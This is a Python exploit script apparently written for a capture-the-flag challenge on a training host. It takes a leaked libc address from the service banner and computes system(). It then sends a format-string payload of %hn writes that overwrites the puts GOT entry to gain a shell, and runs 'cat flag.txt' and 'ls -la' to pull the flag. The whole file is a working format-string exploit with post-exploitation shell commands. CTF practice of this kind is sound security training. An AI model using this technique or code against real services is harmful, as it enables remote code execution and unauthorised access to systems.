import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 23380
SETVBUF_OFF = 0x7A3F0
SYSTEM_OFF = 0x4F760
GOT_PUTS = 0x404000
BUFPOS = 38

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(8)
time.sleep(0.8)
banner = b""
try:
    banner = s.recv(8192)
except Exception:
    pass
m = re.search(rb"0x[0-9a-f]+", banner)
leak = int(m.group(0), 16)
system = leak - SETVBUF_OFF + SYSTEM_OFF
print("system:", hex(system))
w0 = system & 0xFFFF
w1 = (system >> 16) & 0xFFFF
w2 = (system >> 32) & 0xFFFF
targets = sorted([(GOT_PUTS, w0), (GOT_PUTS + 2, w1), (GOT_PUTS + 4, w2)], key=lambda t: t[1])


def build(base_pos):
    spec = ""
    prev = 0
    for i in range(3):
        val = targets[i][1]
        delta = (val - prev) & 0xFFFF
        if delta:
            spec += f"%{delta}c"
        spec += f"%{base_pos + i}$hn"
        prev = val
    return spec


spec = build(BUFPOS)
pad = (-len(spec)) % 8
pos0 = BUFPOS + (len(spec) + pad) // 8
spec = build(pos0)
pad = (-len(spec)) % 8
pos0 = BUFPOS + (len(spec) + pad) // 8
spec = build(pos0)
pad = (-len(spec)) % 8
payload = spec.encode() + b"P" * pad
for addr, val in targets:
    payload += struct.pack("<Q", addr)
print("payload:", payload[:60], "...", len(payload))
s.sendall(payload + b"\n")
time.sleep(2.0)
# vider ce qui arrive
try:
    pre = s.recv(65536)
    print("pre:", len(pre))
except Exception:
    pass
s.sendall(b"echo SHELL_OK\n")
time.sleep(1.0)
s.sendall(b"cat flag.txt\n")
time.sleep(1.0)
s.sendall(b"ls -la\n")
time.sleep(1.5)
out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:1500])
mm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
if mm:
    print("FLAG:", mm.group(0))
s.close()
